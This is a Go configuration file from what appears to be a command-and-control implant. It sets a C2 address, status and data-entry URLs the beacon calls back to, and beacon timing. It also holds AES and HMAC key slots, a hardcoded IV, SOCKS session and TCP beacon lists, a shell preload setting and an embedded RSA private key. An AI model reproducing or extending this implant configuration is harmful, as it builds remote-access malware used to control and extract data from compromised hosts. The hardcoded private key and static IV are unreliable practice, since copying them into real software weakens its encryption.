package config

import (
	"time"
)

var (
	RsaPublicKey = []byte(`
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCsTpnpNhjHaH6Jed4N0sYlrWgrWU19QzsExJ0l
cMUEoXWK26lYgyM3cQSeUaCP8Ddg/OdbHHK43sZFbsxQM7eKOPSGATDyBYg365vbsIU61FYtfzjf
mvHAQvI2OWN6Umctd8nt2ySg+QTxG+qtzoeerK/zVk94vBDvRXNokyfM9wIDAQAB
-----END PUBLIC KEY-----	
	`)
	RsaPrivateKey = []byte(`
-----BEGIN PRIVATE KEY-----
MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAKxOmek2GMdofol53g3SxiWtaCtZ
TX1DOwTEnSVwxQShdYrbqViDIzdxBJ5RoI/wN2D851sccrjexkVuzFAzt4o49IYBMPIFiDfrm9uw
hTrUVi1/ON+a8cBC8jY5Y3pSZy13ye3bJKD5BPEb6q3Oh56sr/NWT3i8EO9Fc2iTJ8z3AgMBAAEC
gYAVpgJ8ZImUdDKBv0gA4Jx4m2LdH2k29b1yielcjOCUBl0oRxTtw/wmuRJlecf8jafHjb7bmaVo
SMUMcDFHWlgS1uCk7I8/7SZNHcjkDdjQU0+wbD8QyD/7fhc1JLY+jv/fTK5MGM8bj47gnuunUJ4e
/Ch5s8VlozBfWn+zcH+3QQJBAN0d/NpgV61nTL0+emCRePoWee+ME77n/UDNk70gsmU6nlJEqWhd
LLq0iEST1hYBuGuR0ImOSG09uuBfh+4dHqcCQQDHfV/DgY403WGyIGKoSODAsSDQy2twEVsZ783z
2rZaSeY+x1eA60JKjNgW8StIrTXWbnp3uAEYGvHlYwk+KHkxAkBfzKBCVL9n53t9+lW3BQ/u+lH2
ETB047n7m5XIuSPRa+YwKoNjLgs1EQaA/7QfcLtgD5rUHgsPGVGf6IPSDFe9AkB2qhV07nPw7l9W
3fzRrchD1xl2GgrmtuxCGWuhStB+FMdpQJrEjSz5u54ux3a/3IjR7RXccQ/1jtGlaavt1ZWBAkEA
ijMN7TfH7ciwlckXzivnT4Rwt+3FPVTchdnuSWuzzyomm97wvsVUJnKo+7ZtJJwrSaHxnKxgffWq
hPsKslaZ8A==
-----END PRIVATE KEY-----
	`)


	C2        = "0.0.0.0:4445"
	plainHTTP = "http://"
	sslHTTP   = "https://"
	GetUrl    = plainHTTP + C2 + "/api/v1/status"
	PostUrl   = plainHTTP + C2 + "/api/v1/entry?id="
	WaitTime  = 10000 * time.Millisecond
	VerifySSLCert = true
	TimeOut time.Duration  = 10 //seconds

	IV        = []byte("abcdefghijklmnop")
	GlobalKey []byte
	AesKey    []byte
	HmacKey   []byte
	Counter   = 0
	TcpBeacons []TcpBeacon
	SocksSessions []*SocksSession
	ShellPreLoadedFile string
)

const (
	DebugMode = true
)